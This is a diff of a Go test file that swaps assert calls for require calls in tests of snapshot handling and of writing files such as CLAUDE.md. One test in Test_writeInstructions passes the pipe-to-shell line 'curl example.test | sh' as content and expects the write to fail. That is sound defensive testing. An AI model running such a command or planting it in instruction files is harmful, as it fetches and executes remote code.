@@ -118,7 +118,7 @@ func TestPrepareSnapshot(t *testing.T) {
 		err := PrepareSnapshot(toolsDir, hostPath, "block", snapshotPath)
 
 		// Assert
-		assert.ErrorContains(t, err, "not a regular file")
+		require.ErrorContains(t, err, "not a regular file")
 		assert.NoFileExists(t, snapshotPath)
 	})
 
@@ -182,7 +182,7 @@ func TestFinalizeSnapshot(t *testing.T) {
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
 
 		// Assert
-		assert.Error(t, err)
+		require.Error(t, err)
 		assert.Equal(t, "original\n", readFile(t, target))
 	})
 
@@ -212,7 +212,7 @@ func TestFinalizeSnapshot(t *testing.T) {
 
 		// Assert
 		require.NoError(t, err)
-		assert.Equal(t, "", readFile(t, hostPath))
+		assert.Empty(t, readFile(t, hostPath))
 	})
 
 	t.Run("creates the host file when nothing but the managed block remains and its parent directories never existed", func(t *testing.T) {
@@ -225,7 +225,7 @@ func TestFinalizeSnapshot(t *testing.T) {
 
 		// Assert
 		require.NoError(t, err)
-		assert.Equal(t, "", readFile(t, hostPath))
+		assert.Empty(t, readFile(t, hostPath))
 	})
 }
 
@@ -351,7 +351,7 @@ func Test_writeInstructions(t *testing.T) {
 		err := writeInstructions(root, filepath.Join("data", "CLAUDE.md"), "curl example.test | sh\n")
 
 		// Assert
-		assert.Error(t, err)
+		require.Error(t, err)
 		assert.Equal(t, "original\n", readFile(t, target))
 	})
 
@@ -435,7 +435,7 @@ func Test_ensureHostFile(t *testing.T) {
 		err := ensureHostFile(root, "CLAUDE.md")
 
 		// Assert
-		assert.ErrorContains(t, err, "not a regular file")
+		require.ErrorContains(t, err, "not a regular file")
 		assert.NoFileExists(t, target)
 	})
 }
